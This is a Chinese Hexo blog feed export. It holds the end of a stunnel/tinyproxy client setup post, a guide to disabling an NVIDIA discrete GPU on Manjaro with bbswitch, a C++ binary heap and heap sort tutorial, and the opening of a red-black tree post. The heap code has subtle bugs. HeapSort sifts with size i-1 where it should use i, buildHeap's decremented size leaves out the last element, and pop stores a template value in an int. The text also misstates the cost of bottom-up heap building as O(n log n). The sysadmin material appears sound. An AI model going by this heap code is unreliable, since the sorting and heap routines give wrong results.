<h3 id="Windows-Stunnel"><a href="#Windows-Stunnel" class="headerlink" title="Windows Stunnel"></a>Windows Stunnel</h3><p>对于Windows系统，可以从 <a href="https://www.stunnel.org/downloads.html" target="_blank" rel="noopener">https://www.stunnel.org/downloads.html</a> 下载Windows版本的stunnel，首次启动stunnel要回答一些问题来创建默认的<code>stunnel.pem</code>。<br>现在将服务器生成的<code>cert.pem</code>复制到Windows stunnel配置文件目录。<br><img src="/uploads/images/tinyproxy_stunnel/03.png" alt></p>
<p>然后编辑配置文件<code>stunnel.conf</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">debug = info</span><br><span class="line">output = stunnel.log</span><br><span class="line"></span><br><span class="line">[tinyproxy]</span><br><span class="line">client = yes</span><br><span class="line">accept = 6666</span><br><span class="line">connect = 129.204.152.8:3128</span><br><span class="line">;CAfile = cert.pem</span><br><span class="line">cert = cert.pem</span><br><span class="line">key = cert.pem</span><br><span class="line">verify = 3</span><br></pre></td></tr></table></figure>

<p>最后启动stunnel，成功。<br><img src="/uploads/images/tinyproxy_stunnel/04.png" alt></p>
<p>stunnel官网在线帮助手册: <a href="https://www.stunnel.org/static/stunnel.html" target="_blank" rel="noopener">https://www.stunnel.org/static/stunnel.html</a><br>以上便是代理服务器的配置～</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://github.com/tinyproxy/tinyproxy/wiki" target="_blank" rel="noopener">Tinyproxy Wiki</a><br><a href="http://kb.ictbanking.net/article.php?id=380" target="_blank" rel="noopener">Using stunnel and TinyProxy to obfuscate HTTP traffic</a><br><a href="https://blog.csdn.net/qq_39702947/article/details/87714520" target="_blank" rel="noopener">Windows系统Stunnel使用简介</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>CentOS</tag>
        <tag>TinyProxy</tag>
        <tag>HTTP</tag>
        <tag>HTTPS</tag>
      </tags>
  </entry>
  <entry>
    <title>Manjaro/Arch禁用独显</title>
    <url>/linux-ban-nvidia/</url>
    <content><![CDATA[<p>由于本人笔记本是双显卡的，曾几度尝试安装闭源NVIDIA驱动（为了hashcat），然而每次以失败告终，而系统自带的开源nouveau驱动实在太坑了，系统总是会出现一些莫名其妙的bug，忍无可忍之下干脆禁掉独显，只用核显得了。</p>
<a id="more"></a>

<h3 id="bbswitch"><a href="#bbswitch" class="headerlink" title="bbswitch"></a>bbswitch</h3><p>首先需要安装bbswitch模块，用于切换显卡</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman bbswitch</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载模块</span></span><br><span class="line">modprobe bbswitch</span><br><span class="line"><span class="comment"># 卸载模块</span></span><br><span class="line">rmmod bbswitch</span><br></pre></td></tr></table></figure>

<h3 id="禁用独显"><a href="#禁用独显" class="headerlink" title="禁用独显"></a>禁用独显</h3><p>首先查看当前系统是否已经禁用独显</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /proc/acpi/bbswitch</span><br><span class="line">0000:01:00.0 OFF</span><br></pre></td></tr></table></figure>

<p>OFF说明目前已经禁掉独显了，如果不为OFF，那么需要将其关闭</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 关闭独显</span></span><br><span class="line">tee /proc/acpi/bbswitch &lt;&lt;&lt; OFF</span><br><span class="line"><span class="comment"># 打开独显</span></span><br><span class="line">tee /proc/acpi/bbswitch &lt;&lt;&lt; ON</span><br></pre></td></tr></table></figure>

<p>之后还需要告诉系统：modprobe加载bbswitch时关闭独显(load_state=0)，卸载bbswitch时打开独显(unload_state=1)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nano /etc/modprobe.d/bbswitch.conf</span><br><span class="line">options bbswitch load_state=0 unload_state=1</span><br></pre></td></tr></table></figure>

<h3 id="nouveau列入blacklist"><a href="#nouveau列入blacklist" class="headerlink" title="nouveau列入blacklist"></a>nouveau列入blacklist</h3><p>执行<code>tee /proc/acpi/bbswitch &lt;&lt;&lt; OFF</code>后还需要将nouveau列入黑名单，防止它后台运行。<br>在<code>blacklist.conf</code>添加<code>blacklist nouveau</code>禁用nouveau</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nano /etc/modprobe.d/blacklist.conf</span><br><span class="line">blacklist nouveau</span><br></pre></td></tr></table></figure>

<p>在下一次重启<code>lspci</code>就可以看到<code>rev ff</code>表示独显已经关闭了，或者<code>dmesg|grep -i nouveau</code>查看是否含有nouveau的内容</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">01:00.0 3D controller: NVIDIA Corporation GP108BM [GeForce MX250] (rev ff)</span><br></pre></td></tr></table></figure>

<h3 id="rc-local"><a href="#rc-local" class="headerlink" title="rc.local"></a>rc.local</h3><p>将以上操作设置一个系统启动服务，这样在每次开机时就能够关闭独显了。基于Archlinux systemd写一个服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nano /etc/systemd/system/rc-local.service</span><br><span class="line">[Unit]</span><br><span class="line">Description=<span class="string">"/etc/rc.local Compatibility"</span> </span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">ExecStart=/etc/rc.local start</span><br><span class="line">TimeoutSec=0</span><br><span class="line">StandardInput=tty</span><br><span class="line">RemainAfterExit=yes</span><br><span class="line">SysVStartPriority=99</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>

<p>其中<code>/etc/rc.local</code>就是要执行shell的启动脚步，开机时让modprobe加载bbswitch</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">modprobe bbswitch</span><br></pre></td></tr></table></figure>

<p>注意一定要赋予rc.local执行权限 <code>chmod +x /etc/rc.local</code>，最后将服务<code>rc-local</code>设置为开机启动 <code>systemctl enable rc-local.service</code>。</p>
<p>重启计算机后<code>systemctl status rc-local.service</code> 查看rc-local服务状态。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">● rc-local.service - &quot;/etc/rc.local Compatibility&quot;</span><br><span class="line">   Loaded: loaded (/etc/systemd/system/rc-local.service; enabled; vendor preset: disabled)</span><br><span class="line">   Active: active (exited) since Fri 2020-02-14 09:55:13 CST; 4h 35min ago</span><br><span class="line">    Tasks: 0 (limit: 4915)</span><br><span class="line">   Memory: 0B</span><br><span class="line">   CGroup: /system.slice/rc-local.service</span><br><span class="line"></span><br><span class="line">2月 14 09:55:13 system systemd[1]: Starting &quot;/etc/rc.local Compatibility&quot;...</span><br><span class="line">2月 14 09:55:13 system systemd[1]: Started &quot;/etc/rc.local Compatibility&quot;.</span><br><span class="line">2月 14 10:07:31 system systemd[1]: /etc/systemd/system/rc-local.service:10: Support for option SysVStartPriority= has bee&gt;</span><br><span class="line">lines 1-10/10 (END)</span><br></pre></td></tr></table></figure>

<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://xuchen.wang/archives/archbbswitch.html" target="_blank" rel="noopener">Arch下使用bbswitch彻底禁用双显卡笔记本的独立显卡</a><br><a href="https://superuser.com/questions/278396/systemd-does-not-run-etc-rc-local" target="_blank" rel="noopener">systemd does not run /etc/rc.local?</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>二叉堆-堆排序</title>
    <url>/binaryheap-cpp/</url>
    <content><![CDATA[<p>堆是实现<strong>优先级队列</strong>效率很高的数据结构，如C++STL priority_queue、Python PriorityQueue。堆的变体很多，二叉堆、斐波那契堆……由堆实现的一种高效排序算法为堆排序。</p>
<a id="more"></a>

<h4 id="二叉堆"><a href="#二叉堆" class="headerlink" title="二叉堆"></a>二叉堆</h4><p>注意：数据结构中的堆和内存中的堆是两个完全不同的概念，就像数据结构栈和栈内存一样，之间没有必然联系。<br><code>堆(Heap)</code>也可称为大/小根堆、大/小根树，最大/小堆：</p>
<ul>
<li>其中每个节点的值大于等于或小于等于其子节点（如果存在）的值；</li>
<li>一个大根堆（小根堆）是<code>完全二叉树</code>。</li>
</ul>
<p>二叉堆由J.W.J.Williams于1964年引入，作为堆排序的数据结构。<br>一般来说，默认<code>堆</code>指的是<strong>二叉堆(Binary heap)</strong>。<br>由于堆是完全二叉树，因此我们可以用<code>数组</code>描述，也可以用<code>链表</code>描述，不过数组描述比较普遍。</p>
<p>二叉堆中某个节点的左右子节点无论谁大谁小，只要满足子节点的值小于其父节点的值（最大堆）或大于其父节点的值（最小堆）即可。</p>
<p><img src="/uploads/images/data_structure/heap_cpp/01.png" alt></p>
<p>由于用数组描述的二叉堆，堆节点存储在数组中，那么如何用数组表示呢？节点的父子关系又如何解决？<br>1.因为二叉堆是完全二叉树，所以从上到下，从左到右依次将二叉堆节点填入数组，数组之间没有空隙。<br>2.这里有两种映射方式。假设父节点索引为 $i$，左孩子节点索引为 $l$，右孩子节点索引为 $r$，则：<br>数组索引从0开始：</p>
<blockquote>
<p>$l=2i+1$、$r=2i+2$、$i=\lfloor \frac{l-1}{2} \rfloor=\lfloor \frac{r-1}{2} \rfloor$</p>
</blockquote>
<p>数组索引从1开始：</p>
<blockquote>
<p>$l=2i$、$r=2i+1$、$i=\lfloor \frac{l}{2} \rfloor=\lfloor \frac{r}{2} \rfloor$</p>
</blockquote>
<p>两者均采用了<code>向下取整floor</code>是防止数组下标越界同时还能保证不同左右孩子的父节点索引相同；数组索引从1开始是为了简化运算，除此之外没有差别，本文是采用第一种方式。<br><img src="/uploads/images/data_structure/heap_cpp/02.png" alt></p>
<p>本文仅仅演示最大堆的基本操作，最小堆也是类似的。<br>首先定义堆的ADT</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">Heap</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">const</span> T&amp;)</span></span>=<span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span>=<span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> T&amp; <span class="title">top</span><span class="params">()</span></span>=<span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">pop</span><span class="params">()</span></span>=<span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">bool</span> <span class="title">empty</span><span class="params">()</span></span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">virtual</span> ~Heap()&#123;&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>从<code>Heap</code>派生出最大堆<code>maxHeap</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">maxHeap</span>:</span> <span class="keyword">public</span> Heap&lt;T&gt;&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    maxHeap(<span class="keyword">int</span> init_capacity=<span class="number">20</span>);</span><br><span class="line">    ~maxHeap();</span><br><span class="line">    <span class="comment">// 插入元素</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">const</span> T&amp; data)</span></span>;</span><br><span class="line">    <span class="comment">// 删除堆顶元素</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">pop</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> m_heapSize;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">capacity</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> m_capacity;&#125;</span><br><span class="line">    <span class="comment">// 获取堆顶元素</span></span><br><span class="line">    <span class="function">T&amp; <span class="title">top</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(m_heapSize&gt;=<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> m_heap[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">throw</span> <span class="string">"heap is empty"</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">empty</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> m_heapSize==<span class="number">0</span>;&#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="comment">// 改变数组大小</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">changeHeapCapacity</span><span class="params">(<span class="keyword">int</span> oldLength,<span class="keyword">int</span> newLength)</span></span>&#123;</span><br><span class="line">        T *temp=<span class="keyword">new</span> T[newLength];</span><br><span class="line">        m_capacity=newLength;</span><br><span class="line">        <span class="built_in">std</span>::copy(m_heap,m_heap+m_heapSize,temp);</span><br><span class="line">        <span class="keyword">delete</span>[] m_heap;</span><br><span class="line">        m_heap=temp;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    T *m_heap;</span><br><span class="line">    <span class="keyword">int</span> m_capacity;</span><br><span class="line">    <span class="keyword">int</span> m_heapSize;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h5 id="二叉堆的插入"><a href="#二叉堆的插入" class="headerlink" title="二叉堆的插入"></a>二叉堆的插入</h5><p>最大堆的插入必须要确保每个节点$\ge$其子节点。<br>向最大堆插入一个节点步骤如下：</p>
<ul>
<li>在最大堆的底部最左边添加一个新节点作为子节点，也就是在数组内有效元素的下一个位置插入；</li>
<li>若子节点&gt;父节点，则交换它们的值，继续向上调整；否则调整结束。</li>
</ul>
<p>二叉堆插入时间复杂度为$O(Height)=O(\log n)$。</p>
<p>向上调整就像冒泡排序一样，从叶子到根不断将新节点移动到某个位置直到该新节点$\le$其父节点。<br>以下图为例，假设数组大小为12，在数组尾部插入70后是不满足二叉堆性质的，因此需要调整。调整方法很简单，依次将70“上浮”到某个合适的位置，也就是通过比较该节点与父节点的值来进行的。<br><img src="/uploads/images/data_structure/heap_cpp/03.png" alt><br>由于70&gt;45，<code>节点70</code>在数组中的索引为8，可以计算出<code>父节点45</code>索引为$\lfloor \frac{8-1}{2} \rfloor=3$，于是交换他们的值，此时<code>节点70</code>所在数组的索引为3；<br><img src="/uploads/images/data_structure/heap_cpp/04.png" alt></p>
<p>接着继续判断<code>节点70</code>和<code>父节点60</code>大小，70&gt;60，继续交换<code>节点70</code>与<code>父节点60</code>的值；此时70&lt;80，调整结束。</p>
<p><img src="/uploads/images/data_structure/heap_cpp/05.png" alt></p>
<p>如果在空堆中插入节点直接插入即可，注意此处并没有直接交换父节点和子节点，而是将父节点不断的向下移动，最后在合适位置插入新节点。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">maxHeap</span>&lt;T&gt;:</span>:push(<span class="keyword">const</span> T&amp;data)&#123;</span><br><span class="line">    <span class="comment">// 数组扩容</span></span><br><span class="line">    <span class="keyword">if</span>(m_heapSize&gt;=m_capacity)&#123;</span><br><span class="line">        changeHeapCapacity(m_capacity,<span class="number">2</span>*m_capacity);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 子节点索引</span></span><br><span class="line">    <span class="keyword">int</span> index=m_heapSize;</span><br><span class="line">    <span class="comment">// 父节点索引，向下取整</span></span><br><span class="line">    <span class="keyword">int</span> parent_index=((index<span class="number">-1</span>)/<span class="number">2</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 向上调整</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(index==<span class="number">0</span>)<span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// 若子节点大于父节点，继续向上调整</span></span><br><span class="line">        <span class="keyword">if</span>(data &gt; m_heap[parent_index])</span><br><span class="line">            m_heap[index]=m_heap[parent_index];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        index=parent_index;</span><br><span class="line">        parent_index=((index<span class="number">-1</span>)/<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    m_heap[index]=data;</span><br><span class="line">    m_heapSize++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="二叉堆的删除"><a href="#二叉堆的删除" class="headerlink" title="二叉堆的删除"></a>二叉堆的删除</h5><p>一般二叉堆的删除指的是删除堆顶元素，其步骤如下：</p>
<ul>
<li>删除堆顶元素并将二叉堆最底层的最后一个节点(数组最后一个元素)替换到堆顶位置(数组第一个元素)；</li>
<li>先比较父节点的左右孩子的大小，<code>较大的子节点</code>再与<code>父节点</code>进行比较，若父节点&lt;其子节点，继续向下调整；否则调整结束。</li>
</ul>
<p>二叉堆删除时间复杂度为$O(Height)=O(\log n)$。</p>
<p><img src="/uploads/images/data_structure/heap_cpp/06.png" alt><br>删除根节点80，将节点45替换到根节点，此时不满足二叉堆性质，故继续向下调整。此时有效数组大小为<code>heapSize-1</code>。<br><img src="/uploads/images/data_structure/heap_cpp/07.png" alt></p>
<ul>
<li>父节点45的左右孩子节点70&gt;50且45&lt;70，故交换值后继续向下调整；</li>
<li>父节点45的左右孩子节点60&gt;40且45&lt;60，故交换值后继续向下调整；</li>
<li>父节点45只有左孩子且45&gt;10，故调整结束。</li>
</ul>
<p><img src="/uploads/images/data_structure/heap_cpp/08.png" alt></p>
<p>类似插入操作此处也并没有直接交换父节点和子节点值，而是将子节点不断的向上移动，最后在合适位置插入旧值。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">maxHeap</span>&lt;T&gt;:</span>:pop()&#123;</span><br><span class="line">    <span class="keyword">if</span>(m_heapSize&lt;=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> index=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> child_index=<span class="number">2</span>*index+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> lastChild=m_heap[--m_heapSize];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向下调整</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(child_index &gt;= m_heapSize)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// 当父节点只有一个左孩子时，child_index+1 &lt; m_heapSize不成立</span></span><br><span class="line">        <span class="keyword">if</span>(child_index+<span class="number">1</span> &lt; m_heapSize &amp;&amp; m_heap[child_index]&lt;m_heap[child_index+<span class="number">1</span>])&#123;</span><br><span class="line">            child_index++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 若父节点&lt;子节点，继续向下调整</span></span><br><span class="line">        <span class="keyword">if</span>(lastChild &lt; m_heap[child_index])</span><br><span class="line">            m_heap[index]=m_heap[child_index];</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        index=child_index;</span><br><span class="line">        child_index=<span class="number">2</span>*index+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    m_heap[index]=lastChild;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="构建二叉堆"><a href="#构建二叉堆" class="headerlink" title="构建二叉堆"></a>构建二叉堆</h5><p>构建二叉堆是在一个循环内不断地插入元素，实际上这是Williams法，其复杂度为$O(n\log n)$。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="built_in">array</span>[]=&#123;<span class="number">90</span> , <span class="number">40</span> ,<span class="number">30</span> ,<span class="number">60</span> ,<span class="number">70</span> ,<span class="number">200</span> ,<span class="number">20</span> ,<span class="number">10</span> ,<span class="number">50</span> ,<span class="number">80</span>&#125;;</span><br><span class="line">maxHeap&lt;<span class="keyword">int</span>&gt;mhp;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> &amp;&amp;x:<span class="built_in">array</span>) &#123;</span><br><span class="line">    mhp.push(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是，Williams的方法不够好。事实上，我们可以直接在原数组通过向下调整的方法来建堆，而且这种方法比上面的方法还要快。<br>维基百科中有一段话</p>
<blockquote>
<p>More specifically if all the subtrees starting at some height $h$ have already been “heapified” (the bottommost level corresponding to $h=0$), the trees at height $h+1$ can be heapified by sending their root down along the path of maximum valued children when building a max-heap, or minimum valued children when building a min-heap</p>
</blockquote>
<p>大概意思是说，如果一个二叉堆的底层子树也是二叉堆的话，那么可以逐层向上合并这些子二叉堆，也就是在$h$层存在多个子树已经堆化，那么在$h+1$层可以很快的完成调整。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Build-Max-Heap (A):</span><br><span class="line">    heap_length[A] ← length[A]</span><br><span class="line">    for each index i from floor((length[A]-1-1)/2) downto 0 do:</span><br><span class="line">        Max-Heapify(A, i)</span><br></pre></td></tr></table></figure>

<p>比如下面这张图，数组表示为<code>[90 40 30 60 70 200]</code>，这不是一个二叉堆，现在需要将其调整为二叉堆。<br>从<code>floor((length[A]-1-1)/2)</code>开始（最后一个子节点的父节点），依次递减直到<code>0</code>（根节点），虚线框表示已经完成堆化的子树。</p>
<p>其中<code>parent</code>代表要下浮的节点，从父节点开始将<code>parent</code>下浮到某个合适位置。最后结果就是真正的二叉堆<code>[200 70 90 60 40 30]</code>。</p>
<p><img src="/uploads/images/data_structure/heap_cpp/09.png" alt></p>
<p>总之该方法一句话搞定：逐层向上（从右到左，从下到上）的向下调整。<br>代码如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">buildHeap</span><span class="params">(T*<span class="built_in">array</span>,<span class="keyword">int</span> size)</span></span>&#123;</span><br><span class="line">    <span class="keyword">delete</span> []m_heap;</span><br><span class="line">    m_heap=<span class="built_in">array</span>;</span><br><span class="line">    m_capacity=size;</span><br><span class="line">    m_heapSize=size--;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = (size<span class="number">-1</span>)/<span class="number">2</span>; i &gt;=<span class="number">0</span>; --i)&#123;</span><br><span class="line">        <span class="comment">// 父节点索引</span></span><br><span class="line">        <span class="keyword">int</span> index=i;</span><br><span class="line">        <span class="comment">// 子节点索引</span></span><br><span class="line">        <span class="keyword">int</span> child_index=<span class="number">2</span>*index+<span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 下浮父节点parent          </span></span><br><span class="line">        T parent=m_heap[index];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 向下调整</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(child_index&gt;=size)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">if</span>(child_index+<span class="number">1</span>&lt;size&amp;&amp;m_heap[child_index]&lt;m_heap[child_index+<span class="number">1</span>])</span><br><span class="line">                child_index++;</span><br><span class="line">            <span class="keyword">if</span>(parent&gt;=m_heap[child_index])</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            m_heap[index]=m_heap[child_index];</span><br><span class="line"></span><br><span class="line">            index=child_index;</span><br><span class="line">            child_index=index*<span class="number">2</span>+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        m_heap[index]=parent;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>虽然该方法复杂度可以说是$O(n\log n)$，但比第一种方法要快很多。</p>
<h4 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h4><p>利用最大堆可以对数组升序排序，最小堆可以对数组降序排序。堆排序通过每次“删除”（交换数组首尾元素）堆顶元素（最大/小值），再重新构建二叉堆，使得数组内元素由后往前依次减小，从而数组变得有序。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">down</span><span class="params">(<span class="keyword">int</span> *<span class="built_in">array</span>,<span class="keyword">int</span> size,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> index=i;</span><br><span class="line">    <span class="keyword">int</span> child_index=<span class="number">2</span>*index+<span class="number">1</span>;            </span><br><span class="line">    <span class="keyword">int</span> x=<span class="built_in">array</span>[index];</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(child_index&gt;=size)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span>(child_index+<span class="number">1</span>&lt;size&amp;&amp;<span class="built_in">array</span>[child_index]&lt;<span class="built_in">array</span>[child_index+<span class="number">1</span>])</span><br><span class="line">            child_index++;</span><br><span class="line">        <span class="keyword">if</span>(x&gt;=<span class="built_in">array</span>[child_index])</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">array</span>[index]=<span class="built_in">array</span>[child_index];</span><br><span class="line">        index=child_index;</span><br><span class="line">        child_index=index*<span class="number">2</span>+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">array</span>[index]=x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">HeapSort</span><span class="params">(<span class="keyword">int</span> *<span class="built_in">array</span>,<span class="keyword">int</span> size)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> index,child_index,parent,child;</span><br><span class="line">    <span class="comment">// 构建堆，下到上</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = (size<span class="number">-1</span><span class="number">-1</span>)/<span class="number">2</span>; i &gt;=<span class="number">0</span>; --i)&#123;</span><br><span class="line">        down(<span class="built_in">array</span>,size,i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 交换数据后重新构建堆，上到下</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = size<span class="number">-1</span>; i &gt;=<span class="number">0</span>; --i)&#123;</span><br><span class="line">        swap(<span class="built_in">array</span>[i],<span class="built_in">array</span>[<span class="number">0</span>]);</span><br><span class="line">        down(<span class="built_in">array</span>,i<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>DataStructures</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>我所理解的红黑树(RBT)</title>
    <url>/rb-tree-cpp/</url>
    <content><![CDATA[<p>红黑树（Red–Black Tree）是一种自平衡二叉查找树，用于实现<strong>关联数组</strong>。它在1972年由鲁道夫·贝尔（Rudolf Bayer）发明，被称为”对称二叉B树”。</p>
<a id="more"></a>

<h3 id="2-3树"><a href="#2-3树" class="headerlink" title="2-3树"></a>2-3树</h3><p>由于红黑树过于复杂，因此在讲述之前我们先来大致了解一下<code>2-3树</code>，2-3树类似红黑树，也是平衡树，时间复杂度均为$O(\log n)$。<br>2–3树早于红黑树出现，由约翰·霍普克洛夫特于1970年发明。2-3树也称为<code>3阶B-树</code>、<code>3叉搜索树</code>。<br>2-3树中的一个父节点可以有2个子节点也可以有3个子节点。<br>有2个子节点的父节点称为<code>2-</code>节点，该节点有1个key。这类似二叉树的节点<br>有3个子节点的父节点称为<code>3-</code>节点，该节点有2个key。假设父节点键为key1和key2且key1 &lt; key2，左子树L、中子树M、右子树R。则左子树L &lt; key1，key1 &lt; 中子树M &lt; key2 ，右子树 &gt; key2。</p>
<p>2-3树是一棵<code>完全3插搜索树</code>。每个节点要么是<code>叶子节点</code>，要么是<code>2-节点</code>或<code>3-节点</code>，，而且每个节点的子树一定是<code>等高</code>的。<br><img src="/uploads/images/data_structure/rbtree_cpp/01.png" alt></p>
<p>如上图，关键字为 <code>[f h]</code> 的<code>3-节点</code>有3个子节点<code>e</code>、<code>g</code>、<code>[i j]</code>，且 <code>e&lt;f</code>、<code>f&lt;g&lt;h</code>、<code>[i j]&gt;h</code></p>
<h4 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h4><p>2-3树的查找类似bst，比如查找上图的<code>g</code></p>
<ol>
<li>首先g和d比较，g&gt;d，查找右子树</li>
<li>f&lt;g&lt;h，进入中子树</li>
<li>g=g，返回节点，查找结束</li>
</ol>
